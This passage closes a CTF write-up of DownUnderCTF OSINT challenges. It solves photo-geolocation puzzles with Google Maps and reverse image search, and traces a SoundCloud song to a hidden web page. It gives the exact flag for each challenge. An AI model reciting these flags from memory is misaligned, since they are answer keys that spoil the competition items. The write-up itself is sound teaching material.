Looking at [Google Maps](https://www.google.com.au/maps/place/The+Great+Southern+Hotel+Melbourne/@-37.8196792,144.9549522,19z/data=!4m9!3m8!1s0x6ad65d51ec7a3043:0xc24c13994bad2d84!5m2!4m1!1i2!8m2!3d-37.8197222!4d144.955!16s%2Fg%2F11yx7qgrh?entry=ttu) I find the corner of the building where the windows line up mean it has to be taken from **Hotel Indigo Melbourne on Flingers an IHG**.

![gmapscity](gmapscity.png)

Flag: <mark>DUCTF{hotel_indigo_melbourne_on_flinders}</mark>

### Bridget Lives
> After dropping numerous 0days last year Bridget has flown the coop. This is the last picture she posted before going dark. Where was this photo taken from? NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g. `DUCTF{name_of_building}`

We are supplied a `bridget.png`.

![bridget.png](bridget.png)

Due to the unique shape of the bridge I put it into Google Images. After some scrolling and some similar-ish bridges but a different background, I find a match.

![robertsonbridge](robertsonbridge.png)

The Robertson Bridge, Singapore is the one!

![gmapsbridget](gmapsbridget.png)

We can see the circle foyer in the background of the original image, meaning the photo had to be taken from **Four Points**.

Flag: <mark>DUCTF{four_points}</mark>

### back to the jungle
> Did MC Fat Monke just drop a new track????? 👀👀👀

Looking up **MC Fat Monke** yields a [Soundcloud account](https://soundcloud.com/mc-fat-monke) with a song called [Back to Jungle](https://soundcloud.com/mc-fat-monke/back-to-the-jungle).

![soundcloud](soundcloud.png)

Listening to the song has nothing of interest, but attached in the song is a [YouTube link](https://youtu.be/jmhn3IMLQyM).

Inside the video at `2:34` is a few frames of a screen after MC Fat Monke dropped some heat 🔥🔥🔥.

![backtothejungle](backtothejungle.png)

Visiting the [URL in the search bar](https://average-primate-th.wixsite.com/mc-fat-monke-appreci) of the screenshot has the flag.

![wixsite](wixsite.png)

Flag: <mark>DUCTF{wIr_G0iNg_b4K_t00_d3r_jUNgL3_mIt_d15_1!!111!}</mark>

## Thanks for reading!
Big thank you to all the people at DownUnderCTF for the CTF!!

Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.
